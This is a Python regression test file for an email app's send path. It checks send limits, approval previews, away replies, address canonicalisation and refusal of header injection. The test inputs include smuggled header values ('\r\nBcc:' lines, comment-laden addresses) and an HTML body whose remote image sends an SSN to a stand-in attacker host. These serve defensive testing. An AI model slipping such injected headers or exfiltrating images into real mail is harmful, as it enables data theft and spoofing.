"""The send path: regression tests.

The approval card shows every remote image and link host; system sends never make an address
"previously mailed"; send limits hold under concurrent requests; the away message replies only to
authenticated, non-spam senders with a fixed subject; recipients are one canonical address for
policy, headers and SMTP; a token's draft_id cannot destroy a draft; CR/LF/NUL in header inputs are
refused before the standard library sees them."""

import asyncio
import json
import tomllib
from datetime import UTC, datetime
from pathlib import Path

import pytest
from helpers.security_send_path import _ident
from httpx import AsyncClient
from sqlalchemy import select, update

from mailr.db import session_scope, sessionmaker
from mailr.models import Identity, Message, Outbox, PendingAction, Person

AUTH_OK = "Authentication-Results: mx.example; spf=pass smtp.mailfrom=attacker.example; dkim=pass header.d={d}; dmarc=pass"


async def _token(client, scopes, name="agent"):
    r = await client.post("/api/v1/tokens", json={"name": name, "scopes": scopes})
    assert r.status_code == 200, r.text
    a = AsyncClient(transport=client._transport, base_url="http://test")
    a.headers["Authorization"] = f"Bearer {r.json()['token']}"
    return a, r.json()["item"]["id"]


async def _away_on(user, **extra):
    from mailr.models import User
    async with sessionmaker()() as db:
        u = await db.get(User, user.id)
        u.settings = {**(u.settings or {}), "vacation": {"enabled": True, "message": "I am away.", **extra}}
        await db.commit()


async def _ingest_and_away(user, data, roles=("inbox",)):
    from mailr.core import vacation
    from mailr.core.ingest import IngestOptions, ingest_raw
    from mailr.core.store import user_store
    from mailr.models import User
    async with sessionmaker()() as db:
        u = await db.get(User, user.id)
        res = await ingest_raw(db, await user_store(db, u), data, IngestOptions(roles=list(roles), run_intel=False))
        await vacation.maybe_enqueue(db, u, res.message, None)
        await db.commit()
        mid = res.message.id
    await vacation.vacation_reply({"message_id": mid}, None)
    async with sessionmaker()() as db:
        obs = (await db.execute(select(Outbox).where(Outbox.user_id == user.id))).scalars().all()
    return mid, obs


def _now_hdr():
    return datetime.now(UTC).strftime("%a, %d %b %Y %H:%M:%S +0000")


# ------------------------------------------------------------------ The send limit under concurrency


async def test_send_limit_holds_under_concurrent_requests(client, user):
    await _ident(user)
    agent, tid = await _token(client, ["read", "draft", "send"])
    r = await client.post("/api/v1/permissions", json={"subject": f"token:{tid}", "action": "mail.send",
                                                        "effect": "allow", "constraints": {"max_per_hour": 2}})
    assert r.status_code in (200, 201), r.text

    async def one(i):
        return await agent.post("/api/v1/send", json={"payload": {"to": [{"email": "known@else.org"}],
                                                                  "subject": f"s{i}", "text": "hi"}})
    await asyncio.gather(*[one(i) for i in range(12)])
    async with sessionmaker()() as db:
        queued = (await db.execute(select(Outbox).where(Outbox.user_id == user.id, Outbox.status == "queued"))).scalars().all()
    assert len(queued) <= 2, len(queued)
    await agent.aclose()


# ------------------------------------------------------------------ The card shows the whole text


async def test_card_shows_text_after_a_fake_quote_and_every_remote_image(client, user):
    await _ident(user)
    agent, tid = await _token(client, ["read", "draft", "send"])
    secret = "IBAN DE89 3704 0044 0532 0130 00"
    html = ("<p>Thanks, noted. Talk soon.</p>"
            "<p>On Mon, 1 Jan 2026, Alice wrote:</p>"
            f"<p>{secret}</p>"
            '<img src="https://attacker.example/p.png?ssn=123-45-6789" alt="">'
            '<p><a href="https://collect.example/x?d=1">details</a></p>')
    r = await agent.post("/api/v1/send", json={"payload": {"to": [{"email": "known@else.org"}],
                                                           "subject": "Re: invoice", "html": html}})
    assert r.status_code == 202, r.text
    async with sessionmaker()() as db:
        pa = await db.get(PendingAction, r.json()["approval_id"])
        shown = json.dumps(pa.preview["display"])
    assert secret in shown
    assert "https://attacker.example/p.png?ssn=123-45-6789" in shown
    assert "collect.example" in shown
    labels = [f["label"] for f in pa.preview["display"]["fields"]]
    assert "Remote images" in labels and "Links to" in labels
    await agent.aclose()


def test_long_body_is_marked_as_cut():
    from mailr.core.sendgate import send_preview

    class I:  # noqa: E742
        email = "me@example.com"
    p = send_preview({"to": [{"email": "a@b.example"}], "subject": "s", "text": "x" * 70_000}, I(), ["a@b.example"])
    assert "not shown" in p["email"]["text"][-80:]


# ------------------------------------------------------------------ Away replies to junk


async def test_no_away_reply_to_junk_or_with_the_senders_subject(client, user, raw):
    await _ident(user)
    await _away_on(user)
    data = raw("CHEAP PILLS buy now at pills.example", frm="Victim <victim@innocent.example>", date=_now_hdr(),
               extra=AUTH_OK.format(d="innocent.example"))
    _, obs = await _ingest_and_away(user, data, roles=("junk",))
    assert obs == [], [(o.recipients, o.payload.get("subject")) for o in obs]


async def test_no_away_reply_to_an_unauthenticated_sender(client, user, raw):
    await _ident(user)
    await _away_on(user)
    _, obs = await _ingest_and_away(user, raw("Hello", frm="Victim <victim@innocent.example>", date=_now_hdr()))
    assert obs == []
    # A DKIM pass for another domain is not the sender's.
    _, obs = await _ingest_and_away(user, raw("Hello", frm="Other <other@innocent.example>", date=_now_hdr(),
                                              extra="Authentication-Results: mx.example; dkim=pass header.d=evil.example"))
    assert obs == []


async def test_authenticated_sender_gets_a_fixed_subject(client, user, raw):
    await _ident(user)
    await _away_on(user)
    _, obs = await _ingest_and_away(user, raw("CHEAP PILLS at pills.example", frm="Ann <ann@friend.example>",
                                              date=_now_hdr(), extra=AUTH_OK.format(d="friend.example")))
    assert len(obs) == 1 and obs[0].recipients == ["ann@friend.example"]
    assert "PILLS" not in obs[0].payload["subject"]
    assert obs[0].payload["subject"] == "Away message"


async def test_blocked_sender_and_hourly_cap(client, user, raw, monkeypatch):
    from mailr.core import vacation
    await _ident(user)
    await _away_on(user)
    async with session_scope() as db:
        db.add(Person(user_id=user.id, email="blocked@friend.example", blocked=True))
    _, obs = await _ingest_and_away(user, raw("Hi", frm="B <blocked@friend.example>", date=_now_hdr(),
                                              extra=AUTH_OK.format(d="friend.example")))
    assert obs == []
    monkeypatch.setattr(vacation, "MAX_PER_HOUR", 2)
    for i in range(4):
        _, obs = await _ingest_and_away(user, raw("Hi", frm=f"P{i} <p{i}@friend.example>", date=_now_hdr(),
                                                  extra=AUTH_OK.format(d="friend.example")))
    assert len(obs) == 2


# ------------------------------------------------------------------ Away replies and known senders


async def test_away_reply_does_not_make_the_sender_known(client, user, raw):
    from mailr.core import sendgate
    from mailr.core.drafts import build_for_payload
    from mailr.models import User
    await _ident(user, known=())
    await _away_on(user)
    mid, obs = await _ingest_and_away(user, raw("Quick question about the invoice", frm="Mallory <mallory@attacker.example>",
                                                date=_now_hdr(), extra=AUTH_OK.format(d="attacker.example")))
    assert len(obs) == 1, "the away reply goes out to an authenticated sender"
    oid = obs[0].id
    # The worker delivered it and stored the sent copy.
    async with sessionmaker()() as db:
        ob = await db.get(Outbox, oid)
        u = await db.get(User, user.id)
        data, _, _ = await build_for_payload(db, sendgate._SystemPrincipal(u), ob.payload)
        (sendgate._outbox_dir() / f"{oid}.eml").write_bytes(data)
        ob.status = "sent"
        await db.commit()
    await sendgate.store_sent_job({"outbox_id": oid}, None)
    async with sessionmaker()() as db:
        p = (await db.execute(select(Person).where(Person.user_id == user.id,
                                                   Person.email == "mallory@attacker.example"))).scalar_one()
        assert p.sent_count == 0
    agent, tid = await _token(client, ["read", "draft", "send"])
    await client.post("/api/v1/permissions", json={"subject": f"token:{tid}", "action": "mail.send",
                                                    "effect": "allow", "constraints": {"replies_only": True}})
    r = await agent.post("/api/v1/send", json={"payload": {
        "to": [{"email": "mallory@attacker.example"}], "subject": "Re: Quick question about the invoice",
        "text": "Here are the bank details you asked for ...", "in_reply_to_message_id": mid}})
    assert r.status_code == 202, r.text
    assert r.json()["approval"]["preview"]["reason"].endswith("first message to a new address")
    await agent.aclose()


async def test_system_outbox_rows_do_not_count_as_sent_before(client, user):
    from mailr.core.sendgate import send_context
    await _ident(user, known=())
    async with session_scope() as db:
        ident = (await db.execute(select(Identity).where(Identity.user_id == user.id))).scalar_one()
        db.add(Outbox(user_id=user.id, identity_id=ident.id, subject="user", payload={"_system": {"auto_reply": True}},
                      recipients=["x@attacker.example"], status="sent", send_at=datetime.now(UTC)))
        db.add(Outbox(user_id=user.id, identity_id=ident.id, subject="user", payload={"subject": "hi"},
                      recipients=["y@friend.example"], status="sent", send_at=datetime.now(UTC)))
    async with session_scope() as db:
        ident = (await db.execute(select(Identity).where(Identity.user_id == user.id))).scalar_one()
        ctx = await send_context(db, user.id, {}, ["x@attacker.example", "y@friend.example"], ident, None)
    assert ctx["new_recipients"] == ["x@attacker.example"]


# ------------------------------------------------------------------ Addresses with comments


async def test_address_with_a_comment_is_refused_and_deny_holds(client, user):
    await _ident(user)
    agent, tid = await _token(client, ["read", "draft", "send"])
    r = await client.post("/api/v1/permissions", json={"subject": f"token:{tid}", "action": "mail.send",
                                                        "effect": "deny", "constraints": {"domains": ["attacker.example"]}})
    assert r.status_code in (200, 201), r.text
    for sneaky in ("evil@attacker.example (x@trusted.example)", '"x@trusted.example" <evil@attacker.example>',
                   "evil@attacker.example, x@trusted.example", "evil@attacker.example\r\nBcc: z@q.example"):
        r = await agent.post("/api/v1/send", json={"payload": {"to": [{"email": sneaky}], "subject": "x", "text": "x"}})
        assert r.status_code in (400, 403, 422), (sneaky, r.status_code, r.text)
    r = await agent.post("/api/v1/send", json={"payload": {"to": [{"email": " Evil@Attacker.Example "}],
                                                           "subject": "x", "text": "x"}})
    assert r.status_code == 403
    await agent.aclose()


def test_canonical_address():
    from mailr.core.compose import AddressError, canonical_address, envelope_recipients

    assert canonical_address(" Bob@Example.COM ") == "bob@example.com"
    assert canonical_address("bob@bücher.example") == "bob@xn--bcher-kva.example"
    for bad in ("bob@example.com (x@y.z)", "<bob@example.com>", "bob@@example.com", "bob@exa mple.com",
                "a@b.example\n", "a@[127.0.0.1]", "bob", "@example.com", "bob@-x.example"):
        with pytest.raises(AddressError):
            canonical_address(bad)
    p = {"to": [{"email": "Bob@Bücher.example", "name": "Bob"}], "cc": [{"email": "bob@xn--bcher-kva.example"}]}
    assert envelope_recipients(p) == ["bob@xn--bcher-kva.example"]


async def test_headers_use_the_canonical_address(client, user):
    from mailr.core.sendgate import SendGate, _SystemPrincipal
    from mailr.models import User
    await _ident(user)
    async with session_scope() as db:
        u = await db.get(User, user.id)
        ob = await SendGate(db, _SystemPrincipal(u)).submit({"to": [{"email": "Known@Else.ORG"}], "subject": "x", "text": "x"})
        assert ob.payload["to"][0]["email"] == "known@else.org"
        assert ob.recipients == ["known@else.org"]


# ------------------------------------------------------------------ Token sends with a foreign draft


async def test_token_send_with_a_foreign_draft_id_keeps_the_draft(client, user):
    from mailr.core import sendgate
    from mailr.core.drafts import build_for_payload
    from mailr.models import User
    await _ident(user)
    r = await client.post("/api/v1/drafts", json={"payload": {"to": [{"email": "boss@else.org"}],
                                                              "subject": "Long resignation letter", "text": "draft " * 500}})
    assert r.status_code == 200, r.text
    did = r.json()["draft"]["id"]
    agent, tid = await _token(client, ["read", "draft", "send"])
    await client.post("/api/v1/permissions", json={"subject": f"token:{tid}", "action": "mail.send", "effect": "allow"})
    r = await agent.post("/api/v1/send", json={"draft_id": did, "payload": {
        "to": [{"email": "known@else.org"}], "subject": "lunch?", "text": "lunch?"}})
    assert r.status_code == 200, r.text
    oid = r.json()["outbox"]["id"]
    async with sessionmaker()() as db:
        ob = await db.get(Outbox, oid)
        assert ob.draft_jmap_id is None
        u = await db.get(User, user.id)
        data, _, _ = await build_for_payload(db, sendgate._SystemPrincipal(u), ob.payload)
        (sendgate._outbox_dir() / f"{oid}.eml").write_bytes(data)
        ob.status = "sent"
        await db.commit()
    await sendgate.store_sent_job({"outbox_id": oid}, None)
    async with sessionmaker()() as db:
        d = await db.get(Message, did)
        assert not d.deleted
    await agent.aclose()


async def test_token_send_of_the_drafts_own_payload_still_replaces_it(client, user):
    await _ident(user)
    payload = {"to": [{"email": "known@else.org"}], "subject": "Ready", "text": "Final text"}
    r = await client.post("/api/v1/drafts", json={"payload": payload})
    assert r.status_code == 200, r.text
    did = r.json()["draft"]["id"]
    agent, tid = await _token(client, ["read", "draft", "send"])
    await client.post("/api/v1/permissions", json={"subject": f"token:{tid}", "action": "mail.send", "effect": "allow"})
    async with sessionmaker()() as db:
        stored = (await db.get(Message, did)).upstream["draft_payload"]
    r = await agent.post("/api/v1/send", json={"draft_id": did, "payload": stored})
    assert r.status_code == 200, r.text
    async with sessionmaker()() as db:
        assert (await db.get(Outbox, r.json()["outbox"]["id"])).draft_jmap_id == str(did)


# ------------------------------------------------------------------ CRLF and NUL in header inputs


def test_crlf_and_nul_in_header_inputs_are_refused():
    from mailr.core.compose import HeaderInjection, build_message

    base = {"to": [{"email": "a@b.example"}], "subject": "s", "text": "x"}
    me = {"email": "me@example.org", "name": "Me"}
    bad = [
        {**base, "subject": "s\rBcc: x@y.example"},
        {**base, "subject": "s\x00"},
        {**base, "to": [{"email": "a@b.example", "name": "A\r\nBcc: x@y.example"}]},
        {**base, "cc": [{"email": "a@b.example\n"}]},
        {**base, "headers": {"X-Test": "v\rBcc: x@y.example"}},
    ]
    for p in bad:
        with pytest.raises(HeaderInjection):
            build_message(p, from_addr=me)
    with pytest.raises(HeaderInjection):
        build_message(base, from_addr=me, reply_to="r@x.example\r\nBcc: y@z.example")
    with pytest.raises(HeaderInjection):
        build_message(base, from_addr=me, in_reply_to="<a@b>\r\nBcc: y@z.example")
    with pytest.raises(HeaderInjection):
        build_message(base, from_addr=me, attachments=[(b"x", "text/plain", "a\r\nb.txt")])
    with pytest.raises(HeaderInjection):
        build_message(base, from_addr=me, attachments=[(b"x", "text/plain\r\nX: y", "a.txt")])
    assert build_message(base, from_addr=me)["Subject"] == "s"


async def test_header_injection_fails_the_send_at_once(client, user, monkeypatch):
    from mailr.core import drafts, sendgate
    from mailr.core.compose import HeaderInjection
    from mailr.core.sendgate import SendGate, _SystemPrincipal
    from mailr.models import User
    await _ident(user)
    async with session_scope() as db:
        u = await db.get(User, user.id)
        ob = await SendGate(db, _SystemPrincipal(u)).submit({"to": [{"email": "known@else.org"}], "subject": "x", "text": "x"})
        oid = ob.id
        await db.execute(update(Outbox).where(Outbox.id == oid).values(send_at=datetime.now(UTC)))

    async def boom(*a, **kw):
        raise HeaderInjection("a forwarded file name has a line break")
    monkeypatch.setattr(drafts, "build_for_payload", boom)
    await sendgate.send_job({"outbox_id": oid}, None)
    async with sessionmaker()() as db:
        ob = await db.get(Outbox, oid)
        assert ob.status == "failed" and ob.attempts == 1


def test_python_floor_has_the_header_check():
    """CPython 3.12.5 refuses a line break in a header the email package writes; nothing older may run."""
    from packaging.specifiers import SpecifierSet

    data = tomllib.loads((Path(__file__).parent.parent / "pyproject.toml").read_text())
    floor = SpecifierSet(data["project"]["requires-python"])
    assert "3.12.5" in floor and "3.13.0" in floor
    assert not any(v in floor for v in ("3.12.4", "3.12.0", "3.11.9"))


async def test_send_with_a_line_break_in_a_header_input_is_refused(client, user):
    await _ident(user)
    agent, _ = await _token(client, ["read", "draft", "send"])
    base = {"to": [{"email": "known@else.org"}], "subject": "x", "text": "x"}
    for p in ({**base, "subject": "x\r\nBcc: z@q.example"},
              {**base, "to": [{"email": "known@else.org", "name": "K\nBcc: z@q.example"}]},
              {**base, "headers": {"X-Note": "a\rb"}}):
        r = await agent.post("/api/v1/send", json={"payload": p})
        assert r.status_code == 400, r.text
    await agent.aclose()
